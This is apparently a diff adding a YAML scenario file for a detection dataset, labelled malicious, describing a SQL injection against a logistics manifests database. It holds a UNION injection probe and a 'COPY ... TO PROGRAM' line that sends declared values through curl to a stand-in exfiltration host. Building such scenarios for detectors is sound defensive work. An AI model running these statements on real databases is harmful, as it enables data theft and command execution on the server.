@@ -1,0 +1,23 @@
+scenario_id: logistics_sqli_mal_02
+family_id: logistics_sql_injection_manifest_valuation
+domain: logistics
+matched_pair_id: logistics_sqli_pair_02
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "23:20"
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+  - session_label: inject
+    role: partner_etl_service
+    anchor: db
+    timing:
+      tempo: off_hours
+      step_gaps_seconds: [3.5]
+    events:
+      - step_id: probe
+        sql: "SELECT manifest_id, weight_kg FROM manifests WHERE manifest_id = 0 UNION SELECT manifest_id, declared_value FROM manifests"
+      - step_id: exfil
+        sql: "COPY (SELECT manifest_id, declared_value FROM manifests) TO PROGRAM 'curl -s https://partner-mirror.datasink.example/collect -d @- >> /tmp/etl_manifest.log'"
+        connects_to: {ip: "176.65.48.11", port: 8080}
